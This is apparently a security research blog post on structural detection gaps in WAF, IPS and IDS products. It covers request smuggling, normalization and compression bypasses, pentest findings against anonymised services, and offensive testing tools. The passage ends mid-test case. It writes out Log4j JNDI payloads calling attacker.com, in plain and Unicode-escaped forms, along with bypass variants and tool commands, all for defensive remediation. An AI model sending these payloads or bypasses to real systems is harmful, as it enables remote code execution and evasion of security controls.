---
title: "WAF/IPS/IDS Detection Gap Analysis and Remediation Direction"
date: 2026-03-13
draft: false
featured: true
tags: ["Mind", "WAF", "IPS", "IDS", "HTTP Request Smuggling", "Detection Engineering", "WAF Bypass", "Security Operations"]
categories: ["Security Research", "Security Operations"]
summary: "A structural analysis of WAF, IPS, and IDS detection gaps, focused on parsing discrepancies, visibility failures, and practical remediation priorities."
image: "/images/pdf-previews/Structural_Parsing_Gaps_p1.webp"
---

## Video

{{< youtube BolChS38ESI >}}

## PDF

- **Open (new tab):** [`/files/Structural_Parsing_Gaps.pdf`](/files/Structural_Parsing_Gaps.pdf)

<iframe
  id="pdfjs-waf-ips-ids-en"
  src="/pdfjs/single.html?file=/files/Structural_Parsing_Gaps.pdf#page=1"
  width="100%"
  height="560"
  style="border: 1px solid #e5e7eb; border-radius: 8px;"
></iframe>

<script>
  (function () {
    const iframe = document.getElementById("pdfjs-waf-ips-ids-en");
    if (!iframe) return;
    window.addEventListener("message", function (e) {
      if (e.origin !== window.location.origin) return;
      const data = e.data || {};
      if (data.type !== "pdfjs-resize") return;
      if (typeof data.height !== "number") return;
      iframe.style.height = Math.max(420, Math.min(data.height, 980)) + "px";
    });
  })();
</script>

> If the PDF does not render, open it here: [`/files/Structural_Parsing_Gaps.pdf`](/files/Structural_Parsing_Gaps.pdf)

## **WAF/IPS/IDS Detection Gap Analysis and Remediation Direction**

This report analyzes the structural detection limitations that perimeter security solutions (WAF, IPS, IDS) face in real-world operational environments and proposes practical remediation directions. Recent attack trends have evolved beyond simple signature evasion to exploit **parsing discrepancies** between security appliances and backend servers. In particular, PortSwigger's 2025 research reported that request boundary ambiguity in HTTP/1.1 remains widespread, and WAFFLED confirmed **1,207 unique bypasses** through structural parsing discrepancies across major WAF and framework combinations. Furthermore, public incident reports demonstrate that detection failures stem more from **normalization inconsistencies, TLS visibility loss, and sensor failures/overload** than from bypass payloads themselves.

The root cause lies not in **payload variations** but in **parsing discrepancies between WAF, proxy, cache, and application frameworks**. Specifically, these can be classified as: (1) the inspection engine selecting the wrong parser branch, (2) partial inspection due to body/header size limits, (3) semantic transformation between the security decision point and actual execution, (4) normalization differences between middle-tier (CDN/cache/proxy) and backend (origin), and (5) request boundaries being calculated differently. Therefore, rather than relying on simple signature-based detection, **reinforcement of the inspection state machine itself** (inspection entry conditions, scope policies, normalization order, parsing-based analysis, and backend behavior correlation) is necessary.

---

## **1. Detection Gap Types — Detailed Analysis (CVE/Research-Based)**

| Category | Detection Field | Representative Cases (CVE/Research) | Current Limitation | Expected Impact | Required Remediation |
| :---- | :---- | :---- | :---- | :---- | :---- |
| **Protocol Desynchronization (HRS)** | Content-Length Transfer-Encoding | James Kettle (2025) [1][2] | HTTP header interpretation priority differences between frontend and backend servers cause request boundary recognition mismatches | Malicious requests hidden within legitimate requests that pass WAF validation, enabling ACL bypass and session hijacking | Migrate to HTTP/2, block non-standard headers and parser-mismatch-inducing patterns, introduce request normalization tools |
| **0.CL Desync** | Content-Length | James Kettle (2025) [2] | Frontend ignores Content-Length of 0 while backend processes it, enabling request smuggling via deadlock bypass | Passes through WAF blocking via deadlock bypass (e.g., EXNESS $7,500 bounty) | Block initial response gadgets (/con redirect), strict Content-Length 0 handling (AWS ALB strict mode, etc.) |
| **HTTP/2 Downgrade Desync** | Protocol Version / Headers | PortSwigger Research (2025) [2] | Header parsing differences occur when downgrading HTTP/2 to HTTP/1.1 (e.g., H2.0 desync) | 24M websites exposed on CDNs like Cloudflare, session hijacking via request smuggling | Apply HTTP/2 end-to-end, restrict downgrade, prohibit upstream header concatenation |
| **Expect-Based Desync** | Expect Header | CVE-2025-32094 (Akamai/Netlify, 2025) [8] | Obfuscated Expect header (e.g., "Expect: y 100-continue")induces parser mismatch | Internal header exposure via RQP (Response Queue Poisoning) ($221,000 bounty) | Block multi-value/non-standard Expect headers, schedule regular HTTP Request Smuggler scans |
| **Parameter Pollution (HPP)** | URL Query POST Body | CVE-2018-14773 (Drupal/Symfony), CVE-2025-7783 [9] | Different server environments handle duplicate parameters differently. Extended to JSON/array formats in 2025 | WAF inspects only specific parameters while malicious payloads are combined and executed at the backend | Apply duplicate parameter blocking policies, synchronize parsing logic with backend technology stack |
| **Path Normalization Mismatch** | REQUEST\_URI | CVE-2025-66490 (Traefik) [4], CVE-2025-3454 (Grafana) [3], CVE-2025-55752 (Tomcat), CVE-2025-27210 (Node.js) | Structural flaw where security rules evaluate pre-normalization values, then pass normalized values to the backend | Admin page access control bypass via path manipulation using encoded slashes (%2F) or duplicate slashes | Re-evaluate routing and security rules after normalization, preemptively block non-standard URL encoding patterns |
| **Inspection Mode Selection Gap** | Content-Type / Boundary / Charset | WAFFLED (2025) [5] | WAF fails to select the correct parser branch when Content-Type is removed/modified, charset/parameter anomalies exist, or boundary is manipulated | Even accurate rules are rendered ineffective if the inspection engine cannot enter the correct parser. 90% of 1,207 unique bypasses reproduced in production | Conservative block/quarantine on abnormal Content-Type, set default action to MATCH on parser failure, verify RFC compliance |
| **Inspection Scope Overflow/Truncation** | Request Body / Headers / Cookies | AWS WAF official documentation [10][11] | Size limits exist for Body/Header/Cookie inspection. When exceeded, only the beginning is inspected or inspection is skipped entirely. Without Content-Encoding decompression, raw matching leaves the entire compressed body as a blind spot (empirically confirmed: Section 4-3) | Placing payloads beyond inspection limits in large JSON arrays, multipart uploads, or long header chains makes them undetectable. Attack patterns within compressed bodies also go undetected | Set oversize handling to MATCH (block), increase body inspection size limit, enable separate logging for oversized requests, activate Content-Encoding decompression before inspection |
| **JSON Inspection Pipeline Gap** | JSON Body | AWS WAF Bypass case study [6], AWS WAF JSON documentation [11] | JSON Unicode escape not decoded, invalid JSON fallback behavior (EVALUATE_AS_STRING, MATCH, NO_MATCH), evaluation only up to first parsing failure | Virtual patching neutralized, SQLi/XSS payload delivery. Simply "enabling JSON inspection" is insufficient — fallback, partial parse, and oversize policies must also be verified | Full decoding at JSON parser level, set fallback to MATCH, log invalid JSON requests, establish oversize JSON blocking policy |
| **Semantic Reinterpretation Gap (Missing Pre/Post-Routing Re-evaluation)** | X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, x-middleware-subrequest | CVE-2025-29927 (Next.js), OWASP WSTG [12], Google ESPv2 [13] | Security decisions are made based on the original path/method, but actual execution occurs in the context reflected by override headers. Method Override (POST→PUT/DELETE) follows the same pattern | WAF sees POST and allows it through, but the app executes as DELETE. Recognized as a normal path but executes internal admin functions | Unconditionally strip URL/Method Override headers at the edge, maintain a trusted header whitelist, re-evaluate security rules after routing decisions |
| **Middle-Tier to Backend Normalization Gap** | URL Path / Delimiter / Cache Key | PortSwigger Web Cache Deception (2025) [14] | CDN/cache servers and origin servers interpret paths, delimiters, and path mapping differently, causing dynamic responses to be cached as static resources | Authenticated users' sensitive responses stored in public caches, leaking session tokens and personal information | Verify normalization consistency between cache key and origin routing, unify delimiter handling policies between edge and origin |
| **Unicode Visual Confusable Characters** | Request Body / Headers | Ryan Barnett & Angel Hacker (2025) [15] | Pre-normalization inspection fails to detect visual confusable character variants such as dotless ı→I, Kelvin sign→K | Neutralization of OWASP Top-10 WAF rules | Apply Normalize-then-Inspect for all Unicode variants, mandate NFC/NFKC normalization |
| **Encryption/Custom Visibility Deficiency** | Encrypted Payload | DeepSeek iOS app case study [7] | Segments emerge where network appliances cannot decrypt TLS 1.3 or custom encryption | Security appliance payload visibility is lost, making data exfiltration and C2 communications undetectable | L7 inspection after TLS termination point, server-side RASP integration |

---

## **2. Structural Detection Gap Types — Summary**

The table below summarizes not individual bypass techniques, but the **root causes of structural gaps** that can occur in current detection systems, organized by type. Operational priority order: **Protocol Boundary → Semantic Reinterpretation → Inspection Scope → Inspection Mode Selection → Structural Data Manipulation**. HRS and routing/header overrides directly enable authentication/ACL bypass, while oversize and parsing discrepancies have high reproducibility across most API environments.

| Category | Detection Field | Current Limitation | Description | Required Remediation |
| :---- | :---- | :---- | :---- | :---- |
| **Protocol Boundary Gap** | Content-Length / Transfer-Encoding / Protocol Version | Request boundaries are calculated differently by frontend and backend | HRS/desync, HTTP/2 downgrade, 0.CL attacks, Expect header variants, etc. Misaligned request boundaries allow hiding one request within another | Apply HTTP/2 end-to-end, schedule regular desync scanner runs, block non-standard header combinations |
| **Inspection Mode Selection Gap** | Content-Type / Boundary / Charset | WAF fails to select the correct parser branch when Content-Type is removed/modified, charset anomalies exist, or boundary is manipulated | Even correct rules become ineffective if the inspection engine cannot select the right parser branch. WAFFLED confirmed 1,207 unique bypasses of this type | Conservative block/quarantine on abnormal Content-Type, set default action to MATCH (block) on parser failure, consider HTTP-Normalizer proxy |
| **Inspection Scope Gap** | Request Body / Headers / Cookies | Size limits exist for Body/Header/Cookie inspection. When exceeded, only the beginning is inspected or inspection is skipped. Without Content-Encoding (gzip/deflate/br) decompression, raw matching fails to detect attack patterns within compressed bodies | Priority inspection needed for services using large upload APIs, multipart, and long JSON arrays. JSON parsing failure fallback behavior (EVALUATE_AS_STRING, MATCH, NO_MATCH) also falls in this category. Compressed body bypass has been empirically confirmed (Section 4-3, Finding 1) | Set oversize handling to MATCH, increase body inspection size limit, explicitly define invalid JSON fallback policy, log oversized requests, activate Content-Encoding decompression before inspection |
| **Encoding/Normalization/String Transformation** | Request Header / Body | Detection based on pre-normalization values mismatches with final processed values. Simple keyword-based rules are vulnerable to transformations | Double Encoding, Overlong UTF-8, Unicode visual confusables (dotless ı→I, Kelvin sign→K), hex encoding, Case Variation, nested substitution functions, etc. | Normalization and iterative decoding at the same level as the application, NFC/NFKC Unicode normalization, expand structure-based detection beyond fixed keywords |
| **Structural Data Manipulation** | URL / Header / Query / Body | Interpretation inconsistencies for duplicate parameters, Multipart structure changes, and JSON structure variations | When proxy, security appliance, and backend interpret the same request differently, detection and actual processing results diverge. Includes HPP JSON/array format extension (CVE-2025-7783) | Unify duplicate parameter handling policies, verify Multipart boundary RFC compliance, verify proxy-backend interpretation consistency |
| **Semantic Reinterpretation Gap** | Override Headers / URL Path / HTTP Method | Security decisions are made based on original paths/methods, but actual execution occurs in the context of normalized paths or override headers | X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, x-middleware-subrequest, and path normalization bypass should be managed as a single control group | Unconditionally strip externally-sourced override headers at the edge, re-evaluate security rules after routing decisions |
| **Middle-Tier to Backend Normalization Gap** | URL Path / Delimiter / Cache Key | CDN/cache/proxy and origin interpret paths and delimiters differently | Like Web Cache Deception, dynamic responses are cached as static resources, leaking sensitive information. Occurs in architectures where WAF is at the edge and app routing is handled by the origin | Verify cache key-origin routing normalization consistency, unify delimiter handling policies between edge and origin |
| **Application Internal Substitution / Lookup Processing** | Any Field | The final meaning of input values is completed only within the server. Insufficient detection of nested expressions and default value processing | Simple string matching cannot capture dangerous strings formed after server-side substitution, concatenation, and Lookup interpretation. The `${...}` structure itself should be flagged as suspicious | Register template/Lookup structures as threat indicators, verify post-substitution state, supplement with backend behavior-based detection |
| **Encryption/Decryption Segment** | Encrypted / Custom Payload | Network appliance payload visibility loss | In HTTPS or custom encryption/decryption segments, perimeter appliances cannot directly examine request contents | Inspection after TLS termination, SSL Mirror configuration, server-side verification and log collection immediately after decryption |
| **Insufficient Backend Behavior Control** | Server Outbound / Runtime | Input detection failures may lead to server-side malicious behavior | Server's external communications, exception handling, and runtime behavior may be more important indicators than the request itself | Strengthen Egress Filtering, audit logging, and EDR/RASP integration |

---

## **3. IDS/IPS Rule Remediation Recommendations**

When current IDS/IPS rules are header-based or rely primarily on raw byte matching, the following remediations are needed. In addition to existing "normalization enhancement" and "Generic Pattern" approaches, **inspection entry control** and **inspection scope policy** must be added as separate axes. This constitutes **inspection state machine reinforcement**, not merely rule enhancement.

### **3.1 Normalization Enhancement**

Before security appliances inspect payloads, all encodings (URL, Unicode, Base64, Hex, etc.) must be decoded to the same level as the final application before pattern matching. In the current structure where signatures are matched against raw bytes, detection can be evaded with simple variations such as JSON Unicode Escape (`\u0024\u007b` → `${`), Unicode visual confusables (dotless ı→I), and hex encoding. NFC/NFKC Unicode normalization must also be included.

### **3.2 Generic Pattern Application**

Beyond specific strings like `jndi:ldap`, the Lookup structure itself — starting with `${` and ending with `}` — should be registered as a suspicious indicator to widen detection scope. This is essential for comprehensively detecting various variant attacks in Log4j-class vulnerabilities, including nested Lookup, Case Variation, and Default Value syntax.

### **3.3 Inspection Entry Control**

Policies must be established for **conservative blocking/quarantine** rather than unconditional pass-through when `Content-Type` is abnormal (removed, modified, multiply declared). The default action on JSON/Multipart/XML parser failure should be set to `MATCH` (block) to prevent unrecognized requests from passing without inspection. Override headers from external sources (`X-HTTP-Method-Override`, `X-Original-URL`, `X-Rewrite-URL`, `x-middleware-subrequest`) must be unconditionally stripped at the edge. The strict parsing policy should ensure that edge, reverse proxy, and origin all judge based on the **same canonical form**, and if there are HTTP/2 to HTTP/1.1 downgrade segments, separate verification is needed to ensure headers/body/request boundaries are transmitted identically.

### **3.4 Inspection Scope Policy**

Verify oversize thresholds for Body/Header/Cookie, and set the behavior when limits are exceeded to `MATCH` (block) or separate logging. Segments exceeding the body inspection size limit are inherently visibility blind spots, requiring priority inspection for services using large upload APIs, multipart uploads, and long JSON arrays. Fallback behavior for invalid JSON requests and partial parse scope must also be explicitly configured.

### **3.5 Encryption Segment (SSL/TLS) Visibility**

IDS cannot see the contents of segments protected by custom encryption or HTTPS. Decrypted traffic must be delivered to IDS through **SSL visibility appliances (SSL Mirror)**, or WAF should be configured to handle this. However, the mere existence of SSL Mirror is insufficient. In actual operations: (1) where decryption occurs, (2) whether decrypted body/headers are transmitted identically to IDS, (3) whether certificate expiration/policy errors result in fail-open uninspected pass-through, and (4) what percentage of critical traffic is actually decrypted and inspected — a **coverage SLO** must be maintained. TLS visibility appliances should be managed as Tier-0 operational targets, not auxiliary functions.

### **3.6 Server-Side Visibility**

When using custom encryption modules like the target server, detection at the network layer (L4/L7) has clear limitations. In such cases, the most reliable alternative is to consider deploying **EDR (Endpoint Detection and Response)** or **Runtime Application Self-Protection (RASP)** to monitor behavior occurring within the server. Simultaneously, IDS/IPS availability itself must be managed as part of security controls. Sensor restarts, packet drops, reassembly limit exhaustion, and memory spikes directly translate to detection gaps, so appliance health, drop rates, and decryption failure rates must be separately monitored, maintaining minimum visibility through flow logs/endpoint telemetry even during failures.

### **3.7 Response Origin Classification and IPS Verdict Criteria**

In operational environments, it is common but very dangerous to see a single `403` and immediately interpret it as `IPS blocking`. In reality, **front nginx/reverse proxy common block pages**, **upstream application JSON error responses**, and **actual inline IPS silent drops** manifest as different symptoms. Therefore, response interpretation must consider at minimum: `(1) status line, (2) Server header, (3) Content-Type, (4) body fingerprint repeatability, (5) timeout/reset/no-response indicators`.

During retesting, a Docker-based local comparison lab was set up to verify `Suricata inline drop` and `nginx 403` side by side. The result showed that **real inline IPS drops manifested as `timeout + drop event (eve.json)` rather than a friendly `403`**, and common HTML `403` was closer to front proxy/nginx responses. Therefore, the following criteria should be maintained in production results as well.

- A `403` alone does not conclusively indicate IPS blocking.
- Common HTML `403` should be initially treated as `front proxy/nginx response`.
- Responses with `text/json`/`application/json` containing `code`, `message`, `detailMessage` should be initially treated as `upstream app responses`.
- Actual IPS involvement should be confirmed by cross-referencing appliance events, flow logs, and reset/drop traces.

### **3.8 Canonicalization / Cache Key Consistency**

In architectures where Header/Cookie/JSON keys can be duplicated, or where multiple layers can receive different routing hints like `Host`/`:authority`/`X-Forwarded-Host`, it is important to record **which value was ultimately adopted**. Simply blocking requests is insufficient — edge, reverse proxy, and origin must use the same canonical form. In particular, if cache keys become separated from security decision criteria, this can lead to poisoning or unkeyed input, so cache hit indicators (`Age`, `X-Cache`, `CF-Cache-Status`) and origin routing results must be inspected together.

### **3.9 Content Decoding / Charset Visibility**

If only plaintext JSON is inspected without restoring `gzip`, `deflate`, `br`, BOM, and UTF-16 variants, **requests whose meaning changes after restoration** will be missed. Therefore, `Content-Encoding` restoration status, charset/BOM application, and post-restoration body length and oversize policies must be managed together. From an operational perspective, "allowing compressed bodies" and "post-restoration inspection" must be coupled in the same policy.

> **Empirical case (2026-03-12, Service-B)**: When a JNDI string was placed in an uncompressed body over plaintext HTTP, IPS blocked with a timeout; however, when the same string was gzip/deflate compressed, a normal 302 response was returned. The IPS was performing raw byte matching without decompressing `Content-Encoding`. Most IPS/WAF products have body decompression settings (Snort: `decompress_gzip`, Suricata: `decompression.enabled`, Palo Alto: Inspect Compressed Content, Fortinet: Decompress Content), and these settings were likely disabled.

### **3.10 Positive Security / OOB Verdict Hardening**

For APIs where parser discrepancies are continuously discovered, it is more effective to adopt **OpenAPI/Swagger-based Positive Security** to block unknown fields, type mismatches, additionalProperties, and missing required fields at the source, rather than continuously expanding attack patterns. Additionally, OOB callbacks should only be used as supplementary evidence. Without considering DNS sinkhole, egress filtering, outbound proxy, and resolver logs together, it is easy to misjudge `callback not received = not executed`.

---

## **4. Real-World Cases**

### 4-1. Previously Confirmed Cases

| Detection Field | Bypass Method | Description | Reference |
| :---- | :---- | :---- | :---- |
| Request Body | **JSON Unicode Encoding** | Since the API parses JSON bodies using standard parsers such as Gson/Jackson, an attacker can send `"user_id":"\u0024\u007bhostName\u007d-..."`via JSON Unicode escape, and WAF/rules cannot match `\u0024\u007b`as `${` on raw bytes, while only the application parser restores `$`·`{` and forwards it to the auth backend. As a result, Lookup executes in backend logs. Current rule configuration also only detects based on Header values, requiring rule improvement. | Auth backend server Log4j Lookup vulnerability (JSON Unicode Escape bypass possible) |
| Request Body | **Custom Encrypt/Decrypt** | When using a custom Encrypt module to encrypt attack payloads before sending to the target server, SOC cannot detect whether an attack occurred. | Target-specific |

### 4-2. Test Results (2026-03-10~11, service-a.example.com 155 test cases)

**Test Targets**: www.service-a.example.com (Next.js/nginx), member.service-a.example.com (Apache), msg.service-a.example.com (nginx/Internal API)

#### Finding 1: Unicode Escape Bypasses Primary Inline Blocking Based on Plaintext `${`

In HTTP(80) traffic, plaintext requests containing `${` characters were forcibly terminated via TCP RST or timed out (000). In contrast, Unicode Escape (`\u0024\u007b`) variants returned `403` responses. This means at minimum **the primary inline control that directly blocks plaintext `${` patterns was bypassed**. However, based on follow-up retests and response source classification, this `403` is **more likely a common rejection page from the front nginx/reverse proxy** rather than **an IPS-generated block response**. Therefore, the most accurate interpretation is: `Unicode Escape bypassed plaintext ${-signature-based blocking, but it cannot be definitively stated that it fully reached normal application processing`.

| Payload (msg.service-a.example.com HTTP) | Response | Interpretation |
| :---- | :---- | :---- |
| `${jndi:ldap://...}` plaintext (Header/Body) | **000 (TCP RST)** | Inline device (IPS/firewall) blocks `${` pattern in real-time |
| `\u0024\u007bjndi:ldap://...` Unicode Escape | **403** | Primary inline blocking based on plaintext `${` bypassed, but final app processing unconfirmed |
| `${j${::-n}di:...}` Log4j Default Value variant | **000 (TCP RST)** | Same blocking when `${` is present |
| `${JnDi:lDaP://...}` Case Variation | **000 (TCP RST)** | Same blocking when `${` is present |
| `safe_test` (safe string) | **403** | Baseline rejection path exists |

This demonstrates that at minimum **separate inline controls exist for plaintext `${` patterns, and Unicode Escape can bypass that primary control**. However, a `403` alone cannot distinguish whether Unicode Escape was processed identically through normal business logic or terminated at the front-end rejection page, so JSON Unicode normalization status and final processing must be verified by cross-referencing device events and application logs.

In follow-up reproduction, actual iOS app HTTPS normal requests provided by the user(`GET /api/app/metadata`, `GET /api/app/content?ver=2`)as baselines, all reproduced `200`. With the same header/cookie contract, `Referer: ${jndi:...}` or `Referer: \u0024\u007bjndi:...}`adding these to both APIs maintained identical response codes and Body hashes. In other words, **based on the shared actual app contract, adding header payloads did not break normal application processing**. However, since SSL Mirror and SOC events are unavailable, WAF/IPS/IDS bypass success cannot be confirmed from this result alone.

#### Finding 2: Raw Socket Non-standard HTTP is Processed via Separate Blocking Path

After sending 13 requests using WAFFLED techniques (Content-Type header name variation, NUL byte injection, RFC 2231 boundary splitting, etc.) via raw socket, the tester IP was initially blocked across all `*.service-a.example.com` domains. In follow-up retests, similar requests were processed as `No response received` or `timeout`and immediate full blocking was not reproduced. Thus, it is reasonable to interpret that **a separate blocking/holding path exists for non-standard HTTP traffic, distinct from the normal HTTP response path**.

#### Finding 3: IDS Visibility Unconfirmed for HTTPS Segments

Without confirmation of SSL Mirror presence for the 97 HTTPS tests on Day 1, it is unclear whether IDS could inspect HTTPS payloads. If SSL Mirror is absent, the entire HTTPS segment is an IDS visibility blind spot, corresponding to the 'encryption/decryption segment' gap in Section 2 of this report. Even if SSL Mirror exists, actual visibility can only be confirmed after verifying that body/headers after the decryption point are delivered identically to IDS, and that no interpretation discrepancies occur during HTTP/2 to HTTP/1.1 conversion.

#### Finding 4: App-level Encryption (SEED ECB) — No IDS Visibility

Android app analysis revealed that most target SOI APIs encrypt the request Body using **KISA SEED block cipher (ECB mode)** and transmit it as `enc={base64}`. In this segment, IDS only sees encrypted data and cannot detect plaintext attack payloads. Only some APIs (`app/extra_meta`, `home/v4/blocks`, etc.) are transmitted unencrypted (`crypted=0`).

In follow-up reproduction with the actual iOS app contract(`X-App-Agent: app_7.1.2,ios-26.3.1;accept=json; crypted=0/1`, `X-App-Crypted-Sid: [REDACTED]`)via `GET /api/app/metadata`, `GET /api/app/content?ver=2`, `POST /api/auth/session(enc=...)`replay results each reproduced `200` responses. This means **both unencrypted segments(`crypted=0`)and encrypted segments(`crypted=1`) can reproduce actual mobile app contracts, and normal 200 controls are secured**. Therefore, the encryption-based visibility gap in this report is not mere speculation but a conclusion re-confirmed through actual app traffic reproduction.

Additionally, the `crypted=1` response from `auth/session` could be directly decrypted using the `appmeta` value obtained from `app/extra_meta` as the SEED key. The decrypted result contained actual session information including `sessionId`, `createTime`, `expireTime`, `trackId`, `cdmeta`, `publicKey`, `callbackToken`, `appToken`. In other words, **the structure where clients exchange normally decryptable application payloads while network devices only see ciphertext in that segment** was confirmed with actual samples.

#### Finding 5: HRS/Cache Deception Not Found

- TC-07 Smuggler: CL.TE/TE.CL vulnerability **not found** across 3 domains × 60+ Transfer-Encoding variations
- TC-14 Web Cache Deception: Sensitive data caching **not found** on www.service-a.example.com (Next.js cache enabled)

#### Finding 6: Zero interactsh Callbacks

No interactsh callbacks were received for any JNDI payloads. However, the absence of callbacks alone cannot immediately conclude that 'execution did not occur'. Environmental variables such as egress filtering, DNS sinkhole, outbound proxy, and callback infrastructure session termination also exist. Considering server responses (403/404/405) and early blocking indications in this test, the requests were likely rejected before meaningfully reaching the application layer. Therefore, this result should be conservatively interpreted as **'no external callback evidence observed'**. In particular, since `403` itself is not definitive evidence of IPS blocking, callback absence combined with `403` should not be used to definitively determine execution status.

### 4-3. Test Results (2026-03-12, *.service-b.example.com 103 test cases)

**Test Targets**: www.service-b.example.com (public web), appif.service-b.example.com:27000 (app API), nxt.service-b.example.com (authentication), static.service-b.example.com (static assets)
**Environment**: SSL visibility not secured (Mode B), IDS/IPS console access unavailable

#### Finding 1: Compressed Request Body Bypasses IPS Inspection (TC-18)

plaintext HTTP path(`POST http://www.service-b.example.com/action.do`)4-cell verification matrix was executed, confirming that IPS performs only raw byte matching without decompressing `Content-Encoding`.

| Category | Uncompressed | gzip | deflate |
| :---- | :---- | :---- | :---- |
| Normal body | 302 ✅ | 302 ✅ | - |
| JNDI body | **timeout (blocked)** | **302 (passed)** | **302 (passed)** |
| JNDI header (control) | **timeout (blocked)** | - | - |

IPS is inspecting the body (uncompressed JNDI → timeout), but the same payload passes through when compressed. Header-based detection operates normally (control). Since most IPS/WAF have body decompression settings (Snort `decompress_gzip`, Suricata `decompression.enabled`, Palo Alto/Fortinet Inspect Compressed Content), activation of these settings needs to be verified.

#### Finding 2: IPS Body Inspection Confirmed Regardless of Content-Type (TC-09, Positive)

The same JNDI body was sent with 6 Content-Type variants(`application/json`, `text/plain`, `application/xml`, `application/octet-stream`, `multipart/form-data`, CT none)via IPS-visible HTTP path, resulting in **all timeout (blocked)**. IPS was confirmed to inspect the entire body regardless of Content-Type.

#### Finding 3: IPS TCP Reassembly Operating Normally (TC-08, Positive)

Even when HTTP requests were TCP-segmented in 2-byte units, IPS correctly reassembled them and returned normal 302 responses. When JNDI attack strings were split across segment boundaries, IPS reassembled and detected them, blocking with 408.

#### Finding 4: Broad Detection of JNDI Lookup Variants (TC-03, Positive)

`${jndi:ldap://...}`, `${jndi:rmi://...}`, `${jndi:dns://...}`, nested bypass(`${j${::-n}di:...}`) patterns all resulted in timeout (detected) on IPS-visible HTTP path. This is the same pattern as the `${`-based primary inline blocking confirmed in the Service-A test.

#### Finding 5: Routing Headers Not Filtered, Non-standard JSON Accepted, CT Not Validated

The following was confirmed on the app API (`service-b-appif:27000`, HTTPS). However, since this is an HTTPS path, it is interpreted as app server behavior rather than IPS determination.

- `X-Forwarded-Host`, `X-Original-URL`, `Forwarded` etc. routing headers are forwarded to the app and processed normally (TC-19)
- JSON duplicate keys are processed normally by the app (0000). Non-standard JSON syntax (single quotes, NaN) is also partially accepted (TC-15, TC-22)
- `application/json` the app parses JSON body identically even when sent with other Content-Types (TC-09, TC-11)
- HTTP obsolete line folding and Transfer-Encoding tab prefix are accepted by the server (TC-07)

#### Finding 6: No HTTP/2 Downgrade Discrepancy (TC-16, Positive)

Responses were identical when the same request was sent via HTTP/2 and HTTP/1.1. No security bypass path through protocol downgrade.

---

## **5. Testing Tools**

The automated reproduction skill for test scenarios (TC-01~TC-26) in this report is maintained in the repository below:

> **[windshock/waf-ips-ids-retest](https://github.com/windshock/waf-ips-ids-retest)** — WAF/IPS/IDS detection gap re-verification automation skill. Configure target-profile.yaml and run-config.yaml to execute TCs tailored to the target environment, automatically generating evidence (CSV/JSON) and reports. Includes built-in IPS visibility segment identification, 4-cell verification matrix, and response source classification.

The following open-source tools can perform automated testing corresponding to each structural gap type. All tools should only be used on pre-authorized targets.

| Tool | Repository | Target Gap Type | Key Features |
| :---- | :---- | :---- | :---- |
| **WAFFLED** | [sa-akhavani/waffled](https://github.com/sa-akhavani/waffled) | Inspection mode selection, structural data manipulation | Grammar-based fuzzing auto-generates Content-Type/Boundary/Charset/Field Name variations. Reproduces 1,207 unique bypasses including RFC 2231 parameter continuation, NUL byte injection, CRLF variations. Raw socket-based transmission prevents HTTP client normalization |
| **Smuggler** | [defparam/smuggler](https://github.com/defparam/smuggler) | Protocol boundary | Auto-tests 60~300+ variations of Transfer-Encoding headers (whitespace, control characters, case variations, line breaks, duplicate headers, etc.). Timeout-based CL.TE/TE.CL detection. Automatically saves discovered payloads to `payloads/` directory |
| **Cortisol** | [toxy4ny/cortisol](https://github.com/toxy4ny/cortisol) | Encoding/normalization discrepancy, path normalization | Double/Triple URL Encoding, UTF-8 Overlong Sequence(`%C0%BC`, `%E0%80%BC`, `%F0%80%80%BC`), space2comment, apostrephemask etc. tamper chain application. Auto-detects Cloudflare/AWS/Sucuri/Imperva/ModSecurity/Akamai/F5/Wordfence |
| **WAF-Bypass** | [nemesida-waf/waf-bypass](https://github.com/nemesida-waf/waf-bypass) | Comprehensive (full assessment) | SQLi, XSS, RCE, LFI, SSRF, SSTI, Log4j etc. 18 categories across 7 zones (URL, ARGS, BODY, COOKIE, USER-AGENT, REFERER, HEADER). Supports Base64/HTML-Entity/UTF-16 encoding variations. `--curl-replay`for reproduction command output |
| **WCD Testing Tool** | [Ap6pack/web-cache-deception-testing-tool](https://github.com/Ap6pack/web-cache-deception-testing-tool) | Middle-layer to backend normalization | 6 static extensions(.css, .jpg, .png, .txt, .html, .ico) and 8 delimiters(`;@,!~%#?`)to automatically verify cache hits. Detects cross-user exposure by comparing authenticated/unauthenticated requests |
| **HTTP Request Smuggler** (Burp) | [PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler) | Protocol boundary (HTTP/2 included) | Burp Suite extension. Supports HTTP/2 downgrade (H2.CL, H2.TE, H2.0), pause-based desync, and client-side desync in addition to HTTP/1.1 CL.TE/TE.CL. Auto-detects parser discrepancy (v3.0, 2025) |

### **Tool Installation and Basic Usage**

```bash
# WAFFLED (Python 3 + raw socket relay)
git clone https://github.com/sa-akhavani/waffled.git
cd waffled && pip install -r requirements.txt
# Run fuzzing then raw transmission via http-request-relay

# Smuggler
git clone https://github.com/defparam/smuggler.git
python3 smuggler/smuggler.py -u https://target.example.com/

# Cortisol (Python)
git clone https://github.com/toxy4ny/cortisol.git
python3 cortisol/cortisol.py -t https://target.example.com/search -p q -a xss

# WAF-Bypass (Docker or pip)
docker run nemesida/waf-bypass --host='https://target.example.com'
# or
pip install git+https://github.com/nemesida-waf/waf-bypass.git
python3 -m wafw00f https://target.example.com  # After WAF identification
python3 main.py --host='https://target.example.com' --block-code=403 --threads=10

# Web Cache Deception
git clone https://github.com/Ap6pack/web-cache-deception-testing-tool.git
python3 cache_deception_test.py --url "https://target.example.com/my-account" \
  --cookie "session=VALID_SESSION"
```

---

## **6. Detection Gap Test Scenarios (Penetration Test Cases)**

The scenarios below describe specific test methods for pentesters to verify whether each structural gap actually exists. All tests should only be performed on pre-authorized targets. Available automation tools are noted for each TC.

### **TC-01. Body Detection Bypass via JSON Unicode Escape**

**Target Gap**: Encoding/normalization discrepancy / JSON inspection pipeline gap  
**Purpose**: Verify whether WAF/IDS decodes and inspects Unicode escapes within JSON Body

**Normal Request (Detection Expected)**:

```http
POST /api/auth/verify HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"user_id":"${jndi:ldap://attacker.com/a}"}
```

**Bypass Request (Detection Verification)**:

```http
POST /api/auth/verify HTTP/1.1
Host: target.example.com
Content-Type: application/json

{"user_id":"\u0024\u007bjndi:ldap://attacker.com/a\u007d"}
```

**curl Command**:

```bash
# Normal payload (detection baseline check)
curl -X POST https://target.example.com/api/auth/verify \
  -H "Content-Type: application/json" \
